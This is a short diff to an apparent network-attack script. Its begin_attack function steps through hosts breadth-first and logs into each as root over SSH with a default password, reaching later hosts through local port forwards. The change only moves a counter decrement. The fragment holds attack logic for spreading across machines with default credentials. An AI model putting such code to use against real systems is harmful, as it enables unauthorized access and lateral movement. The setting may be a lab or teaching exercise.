@@ -103,10 +103,10 @@ def begin_attack(client, host):
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
-        initial_comps -= 1
         verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
         try:
             if initial_comps > 0:
+                initial_comps -= 1
                 client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
             else:
                 client.connect("localhost", server.local_forward, username=ROOT, password=DEFAULT_PASS)
